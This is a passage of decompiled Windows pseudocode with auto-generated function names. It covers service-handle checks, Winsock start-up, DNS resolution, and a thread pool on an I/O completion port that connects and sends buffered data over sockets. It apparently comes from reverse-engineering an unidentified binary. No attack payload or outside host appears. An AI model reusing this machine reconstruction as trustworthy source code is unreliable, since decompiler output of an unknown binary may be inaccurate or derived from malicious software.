  local_14 = (SC_HANDLE)0x0;
  local_8 = (SC_HANDLE)0x0;
  DVar1 = FUN_00406faf(&local_14,&local_8,&local_10,&local_c,param_1,param_2);
  if ((DVar1 == 0) && (local_8 != (SC_HANDLE)0x0)) {
    uVar2 = 1;
  }
  FUN_00407067(&local_14,&local_8,&local_10,&local_c);
  return uVar2;
}



undefined4 * __fastcall FUN_004072e7(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined2 local_194;
  undefined4 local_192 [99];
  
  param_1[5] = 0xffffffff;
  *param_1 = &PTR_LAB_0040bed8;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  memset((LPCRITICAL_SECTION)(param_1 + 0xc),0,0x18);
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 0xc));
  memset(param_1 + 6,0,0x18);
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 6));
  local_194 = 0;
  param_1[0x12] = 0;
  puVar2 = local_192;
  for (iVar1 = 99; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  param_1[0x13] = 0;
  param_1[0x14] = 0;
  param_1[0x15] = 0;
  iVar1 = Ordinal_115(0x202,&local_194);
  if (iVar1 == 0) {
    param_1[1] = 1;
  }
  else {
    param_1[1] = 0;
  }
  return param_1;
}



void __fastcall FUN_00407382(undefined4 *param_1)

{
  *param_1 = &PTR_LAB_0040bed8;
  FUN_0040783f(param_1);
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0xc));
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 6));
  Ordinal_116();
  return;
}



int FUN_004073ac(LPSYSTEM_INFO param_1)

{
  HMODULE pHVar1;
  FARPROC pFVar2;
  FARPROC pFVar3;
  HANDLE pvVar4;
  char *pcVar5;
  int *piVar6;
  int local_8;
  
  pcVar5 = s_IsWow64Process_0040e730;
  pHVar1 = GetModuleHandleA(s_kernel32_0040e740);
  pFVar2 = GetProcAddress(pHVar1,pcVar5);
  pcVar5 = s_GetNativeSystemInfo_0040e71c;
  pHVar1 = GetModuleHandleA(s_kernel32_0040e740);
  pFVar3 = GetProcAddress(pHVar1,pcVar5);
  local_8 = 0;
  if ((pFVar2 != (FARPROC)0x0) && (pFVar3 != (FARPROC)0x0)) {
    piVar6 = &local_8;
    pvVar4 = GetCurrentProcess();
    (*pFVar2)(pvVar4,piVar6);
    if (local_8 != 0) {
      (*pFVar3)(param_1);
      return local_8;
    }
  }
  GetSystemInfo(param_1);
  return local_8;
}



undefined4 FUN_0040741b(char *param_1,int *param_2)

{
  int iVar1;
  int *piVar2;
  undefined4 local_10;
  int *local_c;
  uint local_8;
  
  local_c = (int *)0x0;
  local_10 = 0;
  local_8 = 0;
  if ((param_1 == (char *)0x0) || (*param_1 == '\0')) {
    local_10 = 0x57;
  }
  else {
    iVar1 = Ordinal_11(param_1);
    *param_2 = iVar1;
    if (iVar1 == -1) {
      do {
        DnsQuery_A(param_1,1,0,0,&local_c,0);
        if (local_c != (int *)0x0) break;
        local_8 = local_8 + 1;
      } while (local_8 < 0xb);
      piVar2 = local_c;
      if (local_c != (int *)0x0) {
        do {
          if (*(short *)(piVar2 + 2) == 1) {
            *param_2 = piVar2[6];
            break;
          }
          piVar2 = (int *)*piVar2;
        } while (piVar2 != (int *)0x0);
        DnsRecordListFree(local_c,1);
      }
    }
    if (*param_2 == -1) {
      local_10 = 0x4bc;
    }
  }
  return local_10;
}



undefined4 FUN_004074a7(int *param_1)

{
  ULONG_PTR UVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  BOOL BVar5;
  uint *puVar6;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  DWORD DVar7;
  DWORD local_10;
  LPOVERLAPPED local_c;
  uint *local_8;
  
  local_c = (LPOVERLAPPED)0x0;
  local_10 = 0;
  local_8 = (uint *)0x0;
LAB_004074be:
  do {
    do {
      while( true ) {
        DVar7 = 0;
        BVar5 = GetQueuedCompletionStatus
                          ((HANDLE)param_1[2],&local_10,(PULONG_PTR)&local_8,&local_c,0xffffffff);
        if (BVar5 == 0) {
          DVar7 = GetLastError();
        }
        if (local_8 == (uint *)0xffffffff) {
          return 0;
        }
        UVar1 = local_c[1].Internal;
        if (UVar1 != 1) break;
        local_c[1].u.s.Offset = local_10;
        puVar6 = FUN_00407cd7(param_1,(uint)local_8);
        if (puVar6 != (uint *)0x0) {
          FUN_0040846a(puVar6,DVar7,local_c);
          goto LAB_00407650;
        }
        Ordinal_3(local_c[1].InternalHigh);
LAB_0040766b:
        operator_delete(local_c);
      }
      if (UVar1 == 2) {
        puVar6 = FUN_00407cd7(param_1,(uint)local_8);
        if (puVar6 == (uint *)0x0) goto LAB_0040766b;
        *(LPOVERLAPPED *)puVar6[0xc] = local_c;
        puVar6[0xe] = puVar6[0xe] + 1;
        puVar6[0x10] = puVar6[0x10] - 1;
        puVar6[0xc] = (uint)(local_c + 0x668);
        uVar3 = puVar6[0x10];
        if (puVar6[0xf] == 0) {
          if ((DVar7 == 0) && (local_10 != 0)) goto LAB_00407650;
          goto LAB_004075fe;
        }
        goto LAB_00407614;
      }
      if (UVar1 == 3) goto LAB_00407567;
    } while (UVar1 != 4);
    operator_delete(local_c);
    puVar6 = FUN_00407cd7(param_1,(uint)local_8);
  } while (puVar6 == (uint *)0x0);
  if (DVar7 == 0) {
    bVar4 = FUN_00408629(puVar6,0);
    if (CONCAT31(extraout_var,bVar4) != 0) {
      iVar2 = *param_1;
      DVar7 = GetLastError();
      (**(code **)(iVar2 + 0xc))(*puVar6,DVar7);
      goto LAB_00407650;
    }
    (**(code **)(*param_1 + 0xc))(*puVar6,0x3e3);
    goto LAB_00407616;
  }
  (**(code **)(*param_1 + 0xc))(*puVar6,DVar7);
  goto LAB_00407650;
LAB_00407567:
  puVar6 = FUN_00407cd7(param_1,(uint)local_8);
  if (puVar6 == (uint *)0x0) goto LAB_004074be;
  puVar6[0x10] = puVar6[0x10] - 1;
  uVar3 = puVar6[0x10];
  if (puVar6[0xf] == 0) {
    if ((DVar7 != 0) || (local_10 == 0)) {
LAB_004075fe:
      (**(code **)(*param_1 + 4))(local_8,DVar7);
      puVar6[0xf] = 1;
      uVar3 = puVar6[0x10];
      goto LAB_00407614;
    }
    bVar4 = FUN_00408719(param_1,puVar6,local_10);
    if (CONCAT31(extraout_var_00,bVar4) != 0) goto LAB_00407650;
    iVar2 = *param_1;
    DVar7 = GetLastError();
    (**(code **)(iVar2 + 4))(local_8,DVar7);
  }
  else {
LAB_00407614:
    if (0 < (int)uVar3) goto LAB_00407650;
  }
LAB_00407616:
  FUN_00407d47(param_1,local_8);
  FUN_00407b65(param_1,(uint)local_8);
  local_8 = (uint *)0x0;
LAB_00407650:
  FUN_00407d47(param_1,local_8);
  goto LAB_004074be;
}



undefined4 __thiscall FUN_00407682(void *this,DWORD param_1,ushort param_2)

{
  uint uVar1;
  void *_Dst;
  HANDLE pvVar2;
  uintptr_t uVar3;
  int iVar4;
  undefined4 uVar5;
  LPVOID *ppvVar6;
  _SYSTEM_INFO local_30;
  LPCRITICAL_SECTION local_c;
  uint local_8;
  
  uVar5 = 0;
  local_c = (LPCRITICAL_SECTION)((int)this + 0x18);
  local_8 = 0;
  EnterCriticalSection(local_c);
  if (*(int *)((int)this + 4) == 0) {
    param_1 = 0x45a;
  }
  else if ((*(int *)((int)this + 8) == 0) && (*(int *)((int)this + 0x54) == 0)) {
    uVar1 = (uint)param_2;
    if (param_2 == 0) {
      uVar1 = 0x400;
    }
    FUN_004078cd(this,uVar1);
    if ((int)param_1 < 1) {
      local_30.u.dwOemId = 0;
      ppvVar6 = (LPVOID *)&local_30.dwPageSize;
      for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {
        *ppvVar6 = (LPVOID)0x0;
        ppvVar6 = ppvVar6 + 1;
      }
      FUN_004073ac(&local_30);
      if (local_30.dwNumberOfProcessors == 0) {
        local_30.dwNumberOfProcessors = 1;
      }
      param_1 = local_30.dwNumberOfProcessors * 2;
    }
    *(DWORD *)((int)this + 0xc) = param_1;
    _Dst = operator_new(param_1 << 2);
    *(void **)((int)this + 0x10) = _Dst;
    if (_Dst == (void *)0x0) {
      param_1 = 0xe;
    }
    else {
      memset(_Dst,0,*(int *)((int)this + 0xc) << 2);
      pvVar2 = CreateIoCompletionPort((HANDLE)0xffffffff,(HANDLE)0x0,0,0);
      *(HANDLE *)((int)this + 8) = pvVar2;
      if (pvVar2 == (HANDLE)0x0) {
        param_1 = GetLastError();
      }
      else {
        iVar4 = 0;
        if (0 < *(int *)((int)this + 0xc)) {
          do {
            uVar3 = _beginthreadex((void *)0x0,0,FUN_004074a7,this,0,&local_8);
            *(uintptr_t *)(*(int *)((int)this + 0x10) + iVar4 * 4) = uVar3;
            if (*(int *)(*(int *)((int)this + 0x10) + iVar4 * 4) == 0) break;
            iVar4 = iVar4 + 1;
          } while (iVar4 < *(int *)((int)this + 0xc));
          if (iVar4 != 0) {
            uVar5 = 1;
            goto LAB_0040782d;
          }
        }
        param_1 = 0xa4;
      }
    }
  }
  else {
    param_1 = 0x4df;
  }
  if (*(int *)((int)this + 0x10) != 0) {
    _param_2 = 0;
    if (0 < *(int *)((int)this + 0xc)) {
      do {
        pvVar2 = *(HANDLE *)(*(int *)((int)this + 0x10) + _param_2 * 4);
        if (pvVar2 != (HANDLE)0x0) {
          TerminateThread(pvVar2,0);
          CloseHandle(*(HANDLE *)(*(int *)((int)this + 0x10) + _param_2 * 4));
          *(undefined4 *)(*(int *)((int)this + 0x10) + _param_2 * 4) = 0;
        }
        _param_2 = _param_2 + 1;
      } while (_param_2 < *(int *)((int)this + 0xc));
    }
    operator_delete(*(void **)((int)this + 0x10));
    *(undefined4 *)((int)this + 0x10) = 0;
  }
  if (*(HANDLE *)((int)this + 8) != (HANDLE)0x0) {
    CloseHandle(*(HANDLE *)((int)this + 8));
    *(undefined4 *)((int)this + 8) = 0;
  }
  SetLastError(param_1);
  if (*(void **)((int)this + 0x50) != (void *)0x0) {
    operator_delete(*(void **)((int)this + 0x50));
  }
  *(undefined4 *)((int)this + 0x50) = 0;
  if (*(void **)((int)this + 0x54) != (void *)0x0) {
    operator_delete(*(void **)((int)this + 0x54));
  }
  *(undefined4 *)((int)this + 0x54) = 0;
  *(undefined4 *)((int)this + 0x48) = 0;
  *(undefined4 *)((int)this + 0x4c) = 0;
LAB_0040782d:
  LeaveCriticalSection(local_c);
  return uVar5;
}



undefined4 __fastcall FUN_0040783f(void *param_1)

{
  int iVar1;
  
  EnterCriticalSection((LPCRITICAL_SECTION)((int)param_1 + 0x18));
  if (*(int *)((int)param_1 + 0x10) != 0) {
    if (*(int *)((int)param_1 + 8) != 0) {
      iVar1 = 0;
      if (0 < *(int *)((int)param_1 + 0xc)) {
        do {
          PostQueuedCompletionStatus(*(HANDLE *)((int)param_1 + 8),0,0xffffffff,(LPOVERLAPPED)0x0);
          iVar1 = iVar1 + 1;
        } while (iVar1 < *(int *)((int)param_1 + 0xc));
      }
      WaitForMultipleObjects
                (*(DWORD *)((int)param_1 + 0xc),*(HANDLE **)((int)param_1 + 0x10),1,0xffffffff);
      CloseHandle(*(HANDLE *)((int)param_1 + 8));
      *(undefined4 *)((int)param_1 + 8) = 0;
    }
    iVar1 = 0;
    if (0 < *(int *)((int)param_1 + 0xc)) {
      do {
        CloseHandle(*(HANDLE *)(*(int *)((int)param_1 + 0x10) + iVar1 * 4));
        iVar1 = iVar1 + 1;
      } while (iVar1 < *(int *)((int)param_1 + 0xc));
    }
    operator_delete(*(void **)((int)param_1 + 0x10));
    *(undefined4 *)((int)param_1 + 0x10) = 0;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)param_1 + 0x18));
  FUN_004078cd(param_1,0);
  return 0;
}



undefined4 __thiscall FUN_004078cd(void *this,int param_1)

{
  int iVar1;
  void *pvVar2;
  int iVar3;
  int iVar4;
  uint _Size;
  
  EnterCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
  iVar3 = 0;
  if (param_1 == 0) {
    iVar3 = 0;
    if (0 < *(int *)((int)this + 0x48)) {
      iVar4 = 0;
      do {
        iVar1 = *(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar4);
        if (iVar1 != 0) {
          while( true ) {
            pvVar2 = *(void **)(iVar1 + 0x2c);
            if (pvVar2 == (void *)0x0) break;
            *(undefined4 *)(iVar1 + 0x2c) = *(undefined4 *)((int)pvVar2 + 0x8020);
            operator_delete(pvVar2);
            iVar1 = *(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar4);
          }
          pvVar2 = *(void **)(*(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar4) + 0x28);
          if (pvVar2 != (void *)0x0) {
            operator_delete(pvVar2);
          }
          DeleteCriticalSection((LPCRITICAL_SECTION)(*(int *)((int)this + 0x54) + iVar4));
          operator_delete(*(void **)(*(int *)((int)this + 0x54) + 0x18 + iVar4));
        }
        iVar3 = iVar3 + 1;
        iVar4 = iVar4 + 0x1c;
      } while (iVar3 < *(int *)((int)this + 0x48));
    }
    if (*(void **)((int)this + 0x50) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x50));
    }
    *(undefined4 *)((int)this + 0x50) = 0;
    if (*(void **)((int)this + 0x54) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0x54));
    }
    *(undefined4 *)((int)this + 0x54) = 0;
    *(undefined4 *)((int)this + 0x48) = 0;
    *(undefined4 *)((int)this + 0x4c) = 0;
  }
  else if ((*(int *)((int)this + 0x48) < param_1) && (*(int *)((int)this + 0x48) == 0)) {
    *(int *)((int)this + 0x48) = param_1;
    *(undefined4 *)((int)this + 0x4c) = 0;
    _Size = ((param_1 + 0x3ff) / 0x400) * 0x84;
    pvVar2 = operator_new(_Size);
    *(void **)((int)this + 0x50) = pvVar2;
    memset(pvVar2,0,_Size);
    pvVar2 = operator_new(*(int *)((int)this + 0x48) * 0x1c);
    *(void **)((int)this + 0x54) = pvVar2;
    memset(pvVar2,0,*(int *)((int)this + 0x48) * 0x1c);
    iVar4 = 0;
    if (0 < *(int *)((int)this + 0x48)) {
      do {
        InitializeCriticalSection((LPCRITICAL_SECTION)(*(int *)((int)this + 0x54) + iVar3));
        iVar4 = iVar4 + 1;
        iVar3 = iVar3 + 0x1c;
      } while (iVar4 < *(int *)((int)this + 0x48));
    }
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
  return 1;
}



uint __fastcall FUN_00407a0f(int param_1)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  void *pvVar4;
  uint *puVar5;
  int *piVar6;
  int iVar7;
  uint uVar8;
  uint local_10;
  int local_8;
  
  local_10 = 0;
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x30));
  if (*(int *)(param_1 + 0x4c) < *(int *)(param_1 + 0x48)) {
    iVar2 = (*(int *)(param_1 + 0x48) + 0x3ff) / 0x400;
    iVar7 = 0;
    if (0 < iVar2) {
      piVar1 = *(int **)(param_1 + 0x50);
      piVar6 = piVar1;
      do {
        if (*piVar6 != -1) {
          local_8 = 0;
          goto LAB_00407a70;
        }
        iVar7 = iVar7 + 1;
        piVar6 = piVar6 + 1;
      } while (iVar7 < iVar2);
    }
  }
  goto LAB_00407b54;
  while (local_8 = local_8 + 1, local_8 < 0x20) {
LAB_00407a70:
    if ((piVar1[iVar7] & 1 << ((byte)local_8 & 0x1f)) == 0) {
      iVar7 = iVar7 * 0x20 + local_8;
      local_8 = 0;
      iVar7 = iVar7 + iVar2;
      goto LAB_00407a9f;
    }
  }
  goto LAB_00407b54;
  while (local_8 = local_8 + 1, local_8 < 0x20) {
LAB_00407a9f:
    if ((piVar1[iVar7] & 1 << ((byte)local_8 & 0x1f)) == 0) {
      uVar8 = (iVar7 - iVar2) * 0x20 + local_8;
      if ((int)uVar8 < *(int *)(param_1 + 0x48)) {
        uVar3 = rand();
        local_10 = (uVar3 | 0xffff8000) << 0x10 | uVar8 & 0xffff;
        pvVar4 = operator_new(0x48);
        iVar2 = uVar8 * 0x1c;
        *(void **)(*(int *)(param_1 + 0x54) + 0x18 + iVar2) = pvVar4;
        memset(*(void **)(*(int *)(param_1 + 0x54) + 0x18 + iVar2),0,0x48);
        **(uint **)(*(int *)(param_1 + 0x54) + 0x18 + iVar2) = local_10;
        puVar5 = (uint *)(*(int *)(param_1 + 0x50) + iVar7 * 4);
        *puVar5 = *puVar5 | 1 << ((byte)local_8 & 0x1f);
        if (*(int *)(*(int *)(param_1 + 0x50) + iVar7 * 4) == -1) {
          puVar5 = (uint *)(*(int *)(param_1 + 0x50) + ((int)uVar8 / 0x400) * 4);
          *puVar5 = *puVar5 | 1 << ((byte)((int)uVar8 >> 5) & 0x1f);
        }
        *(int *)(param_1 + 0x4c) = *(int *)(param_1 + 0x4c) + 1;
      }
      break;
    }
  }
LAB_00407b54:
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x30));
  return local_10;
}



undefined4 __thiscall FUN_00407b65(void *this,uint param_1)

{
  uint *puVar1;
  void *pvVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  undefined4 local_8;
  
  if (param_1 == 0) {
    local_8 = 0;
  }
  else {
    local_8 = 0;
    uVar6 = param_1 & 0xffff;
    EnterCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
    if ((int)uVar6 < *(int *)((int)this + 0x48)) {
      iVar7 = uVar6 * 0x1c;
      puVar1 = *(uint **)(*(int *)((int)this + 0x54) + 0x18 + iVar7);
      if ((puVar1 != (uint *)0x0) && (*puVar1 == param_1)) {
        if (puVar1[2] != 0) {
          Ordinal_3(puVar1[2]);
          *(undefined4 *)(*(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar7) + 8) = 0;
        }
        iVar4 = *(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar7);
        if (*(int *)(iVar4 + 0x40) < 1) {
          while( true ) {
            pvVar2 = *(void **)(iVar4 + 0x2c);
            if (pvVar2 == (void *)0x0) break;
            *(undefined4 *)(iVar4 + 0x2c) = *(undefined4 *)((int)pvVar2 + 0x8020);
            operator_delete(pvVar2);
            iVar4 = *(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar7);
          }
          pvVar2 = *(void **)(*(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar7) + 0x28);
          if (pvVar2 != (void *)0x0) {
            operator_delete(pvVar2);
          }
          uVar3 = *(uint *)(*(int *)(*(int *)((int)this + 0x54) + 0x18 + iVar7) + 4);
          uVar5 = uVar3 & 0xffff;
          if (((((int)uVar5 < *(int *)((int)this + 0x48)) &&
               (puVar1 = *(uint **)(uVar5 * 0x1c + 0x18 + *(int *)((int)this + 0x54)),
               puVar1 != (uint *)0x0)) && (0 < (int)puVar1[6])) && (*puVar1 == uVar3)) {
            puVar1[7] = puVar1[7] - 1;
          }
          operator_delete(*(void **)(*(int *)((int)this + 0x54) + 0x18 + iVar7));
          *(undefined4 *)(*(int *)((int)this + 0x54) + 0x18 + iVar7) = 0;
          local_8 = 1;
          puVar1 = (uint *)(*(int *)((int)this + 0x50) +
                           ((*(int *)((int)this + 0x48) + 0x3ff) / 0x400 + uVar6 / 0x20) * 4);
          *puVar1 = *puVar1 & ~(1 << ((byte)uVar6 & 0x1f));
          puVar1 = (uint *)(*(int *)((int)this + 0x50) + (uVar6 / 0x400) * 4);
          *puVar1 = *puVar1 & ~(1 << ((byte)((int)uVar6 >> 5) & 0x1f));
          *(int *)((int)this + 0x4c) = *(int *)((int)this + 0x4c) + -1;
        }
        else {
          *(undefined4 *)(iVar4 + 0x3c) = 1;
          local_8 = 0;
        }
      }
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
  }
  return local_8;
}



uint * __thiscall FUN_00407cd7(void *this,uint param_1)

{
  uint *puVar1;
  uint uVar2;
  uint *local_4;
  
  if (param_1 == 0) {
    local_4 = (uint *)0x0;
  }
  else {
    local_4 = (uint *)0x0;
    uVar2 = param_1 & 0xffff;
    EnterCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
    if ((((int)uVar2 < *(int *)((int)this + 0x48)) &&
        (puVar1 = *(uint **)(*(int *)((int)this + 0x54) + 0x18 + uVar2 * 0x1c),
        puVar1 != (uint *)0x0)) && (*puVar1 == param_1)) {
      local_4 = puVar1;
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
    if (local_4 != (uint *)0x0) {
      EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)((int)this + 0x54) + uVar2 * 0x1c));
    }
  }
  return local_4;
}



void __thiscall FUN_00407d47(void *this,uint *param_1)

{
  uint **ppuVar1;
  uint *puVar2;
  uint uVar3;
  
  puVar2 = param_1;
  if (param_1 != (uint *)0x0) {
    param_1 = (uint *)0x0;
    uVar3 = (uint)puVar2 & 0xffff;
    EnterCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
    if ((((int)uVar3 < *(int *)((int)this + 0x48)) &&
        (ppuVar1 = *(uint ***)(*(int *)((int)this + 0x54) + 0x18 + uVar3 * 0x1c),
        ppuVar1 != (uint **)0x0)) && (*ppuVar1 == puVar2)) {
      param_1 = (uint *)ppuVar1;
    }
    LeaveCriticalSection((LPCRITICAL_SECTION)((int)this + 0x30));
    if (param_1 != (uint *)0x0) {
      LeaveCriticalSection((LPCRITICAL_SECTION)(*(int *)((int)this + 0x54) + uVar3 * 0x1c));
    }
  }
  return;
}



uint * __thiscall
FUN_00407dab(void *this,char *param_1,undefined4 param_2,uint param_3,uint param_4)

{
  bool bVar1;
  DWORD dwErrCode;
  uint *puVar2;
  int iVar3;
  undefined3 extraout_var;
  uint *puVar4;
  undefined2 local_1c;
  undefined2 local_1a;
  undefined2 local_18;
  undefined2 uStack_16;
  undefined2 uStack_14;
  undefined4 uStack_12;
  undefined2 uStack_e;
  int local_c;
  void *local_8;
  
  local_1c = 0;
  local_c = 0;
  local_1a = 0;
  local_18 = 0;
  uStack_16 = 0;
  uStack_14 = 0;
  uStack_12 = 0;
  uStack_e = 0;
  puVar4 = (uint *)0x0;
  local_8 = this;
  if (((param_1 == (char *)0x0) || (*param_1 == '\0')) || ((short)param_2 == 0)) {
    dwErrCode = 0x57;
  }
  else {
    dwErrCode = FUN_0040741b(param_1,&local_c);
    if ((dwErrCode != 0) || (puVar4 = (uint *)FUN_00407a0f((int)local_8), puVar4 == (uint *)0x0))
    goto LAB_00407ebf;
    puVar2 = FUN_00407cd7(local_8,(uint)puVar4);
    FUN_00408274((int)puVar2,0,0,0,0);
    puVar2[8] = param_3;
    puVar2[9] = param_4;
    if (puVar2[2] != 0) {
      local_18 = (undefined2)local_c;
      uStack_16 = (undefined2)((uint)local_c >> 0x10);
      local_1a = Ordinal_9(param_2);
      local_1c = 2;
      iVar3 = WSAConnect(puVar2[2],&local_1c,0x10,0,0,0,0);
      if (iVar3 != -1) {
        bVar1 = FUN_00408629(puVar2,1);
        if (CONCAT31(extraout_var,bVar1) != 0) {
          FUN_00407d47(local_8,puVar4);
          SetLastError(0);
          return puVar4;
        }
        dwErrCode = GetLastError();
        goto LAB_00407ea9;
      }
    }
    dwErrCode = Ordinal_111();
  }
LAB_00407ea9:
  if (puVar4 != (uint *)0x0) {
    FUN_00407d47(local_8,puVar4);
    FUN_00407b65(local_8,(uint)puVar4);
  }
LAB_00407ebf:
  SetLastError(dwErrCode);
  return (uint *)0x0;
}



undefined4 __thiscall FUN_00407ecf(void *this,uint *param_1)

{
  uint *puVar1;
  undefined4 uVar2;
  DWORD dwErrCode;
  
  uVar2 = 0;
  if ((*(int *)((int)this + 4) == 0) || (*(int *)((int)this + 8) == 0)) {
    dwErrCode = 0x45a;
  }
  else {
    puVar1 = FUN_00407cd7(this,(uint)param_1);
    if (puVar1 != (uint *)0x0) {
      if (puVar1[6] == 0) {
        if (puVar1[2] != 0) {
          Ordinal_3(puVar1[2]);
        }
        uVar2 = 1;
      }
      FUN_00407d47(this,param_1);
      return uVar2;
    }
    dwErrCode = 0x57;
  }
  SetLastError(dwErrCode);
  return 0;
}



bool __thiscall
FUN_00407f27(void *this,uint *param_1,size_t param_2,void *param_3,size_t param_4,void *param_5)

{
  uint *puVar1;
  uint uVar2;
  uint *puVar3;
  void *pvVar4;
  int iVar5;
  DWORD dwErrCode;
  undefined4 local_10;
  DWORD local_c;
  size_t local_8;
  
  local_c = 0;
  local_10 = 0;
  if (((param_1 != (uint *)0x0) && ((param_4 != 0 || (param_2 != 0)))) &&
     ((param_5 != (void *)0x0 || (param_3 != (void *)0x0)))) {
    if ((*(int *)((int)this + 4) == 0) || (*(int *)((int)this + 8) == 0)) {
      dwErrCode = 0x45a;
      goto LAB_004080f1;
    }
    puVar3 = FUN_00407cd7(this,(uint)param_1);
    if (puVar3 != (uint *)0x0) {
      while ((param_2 != 0 || (param_4 != 0))) {
        if (puVar3[0xb] == 0) {
          pvVar4 = operator_new(0x8024);
          puVar3[0xb] = (uint)pvVar4;
          memset(pvVar4,0,0x8024);
          *(undefined4 *)((int)pvVar4 + 0x14) = 2;
          *(int *)((int)pvVar4 + 0x801c) = (int)pvVar4 + 0x18;
          *(undefined4 *)((int)pvVar4 + 0x8018) = 0x8000;
          puVar3[0xd] = puVar3[0xd] + 1;
          puVar3[0xe] = puVar3[0xe] + 1;
          puVar3[0xc] = (int)pvVar4 + 0x8020;
        }
        pvVar4 = (void *)puVar3[0xb];
        *(undefined4 *)((int)pvVar4 + 0x8018) = 0;
        puVar1 = (uint *)((int)pvVar4 + 0x8018);
        if (param_2 == 0) {
LAB_00408031:
          uVar2 = *puVar1;
          if ((uVar2 < 0x8000) && (param_4 != 0)) {
            local_8 = param_4;
            if ((int)(0x8000 - uVar2) <= (int)param_4) {
              local_8 = 0x8000 - uVar2;
            }
            memcpy((void *)(uVar2 + 0x18 + (int)pvVar4),param_5,local_8);
            param_4 = param_4 - local_8;
            param_5 = (void *)((int)param_5 + local_8);
            *puVar1 = *puVar1 + local_8;
          }
        }
        else {
          local_8 = param_2;
          if (0x7fff < (int)param_2) {
            local_8 = 0x8000;
          }
          memcpy((void *)((int)pvVar4 + 0x18),param_3,local_8);
          param_2 = param_2 - local_8;
          param_3 = (void *)((int)param_3 + local_8);
          *puVar1 = local_8;
          if (param_2 == 0) goto LAB_00408031;
        }
        memset(pvVar4,0,0x14);
        local_10 = 0;
        iVar5 = WSASend(puVar3[2],puVar1,1,&local_10,0,pvVar4,0);
        if (iVar5 == -1) {
          local_c = Ordinal_111();
          if (local_c != 0x3e5) break;
          local_c = 0;
        }
        puVar3[0x10] = puVar3[0x10] + 1;
        uVar2 = *(uint *)((int)pvVar4 + 0x8020);
        puVar3[0xe] = puVar3[0xe] - 1;
        puVar3[0xb] = uVar2;
        if (uVar2 == 0) {
          puVar3[0xc] = (uint)(puVar3 + 0xb);
        }
      }
      FUN_00407d47(this,param_1);
      SetLastError(local_c);
      return local_c == 0;
    }
  }
  dwErrCode = 0x57;
LAB_004080f1:
  SetLastError(dwErrCode);
  return false;
}



bool __thiscall FUN_004080ff(void *this,uint *param_1,size_t param_2,void *param_3)

{
  uint uVar1;
  uint *puVar2;
  void *pvVar3;
  int iVar4;
  DWORD DVar5;
  undefined4 local_c;
  size_t local_8;
  
  local_c = 0;
  if (((param_1 != (uint *)0x0) && (param_2 != 0)) && (param_3 != (void *)0x0)) {
    if ((*(int *)((int)this + 4) == 0) || (*(int *)((int)this + 8) == 0)) {
      DVar5 = 0x45a;
      goto LAB_0040825d;
    }
    puVar2 = FUN_00407cd7(this,(uint)param_1);
    if (puVar2 != (uint *)0x0) {
      do {
        if (puVar2[0xb] == 0) {
          pvVar3 = operator_new(0x8024);
          puVar2[0xb] = (uint)pvVar3;
          memset(pvVar3,0,0x8024);
          *(undefined4 *)((int)pvVar3 + 0x14) = 2;
          *(int *)((int)pvVar3 + 0x801c) = (int)pvVar3 + 0x18;
          *(undefined4 *)((int)pvVar3 + 0x8018) = 0x8000;
          puVar2[0xd] = puVar2[0xd] + 1;
          puVar2[0xe] = puVar2[0xe] + 1;
          puVar2[0xc] = (int)pvVar3 + 0x8020;
        }
        pvVar3 = (void *)puVar2[0xb];
        local_8 = param_2;
        if (0x7fff < (int)param_2) {
          local_8 = 0x8000;
        }
        memcpy((void *)((int)pvVar3 + 0x18),param_3,local_8);
        param_2 = param_2 - local_8;
        param_3 = (void *)((int)param_3 + local_8);
        *(size_t *)((int)pvVar3 + 0x8018) = local_8;
        memset(pvVar3,0,0x14);
        local_c = 0;
        iVar4 = WSASend(puVar2[2],(size_t *)((int)pvVar3 + 0x8018),1,&local_c,0,pvVar3,0);
        if ((iVar4 == -1) && (DVar5 = Ordinal_111(), DVar5 != 0x3e5)) goto LAB_00408238;
        puVar2[0x10] = puVar2[0x10] + 1;
        uVar1 = *(uint *)((int)pvVar3 + 0x8020);
        puVar2[0xe] = puVar2[0xe] - 1;
        puVar2[0xb] = uVar1;
        if (uVar1 == 0) {
          puVar2[0xc] = (uint)(puVar2 + 0xb);
        }
      } while (param_2 != 0);
      DVar5 = 0;
LAB_00408238:
      FUN_00407d47(this,param_1);
      SetLastError(DVar5);
      return DVar5 == 0;
    }
  }
  DVar5 = 0x57;
LAB_0040825d:
  SetLastError(DVar5);
  return false;
}



undefined4 FUN_00408274(int param_1,int param_2,int param_3,int param_4,short param_5)

{
  int iVar1;
  
  if (((0 < param_3) && (0 < param_4)) && (param_5 != 0)) {
    *(int *)(param_1 + 0x10) = param_3;
    *(int *)(param_1 + 0x18) = param_4;
    *(short *)(param_1 + 0xc) = param_5;
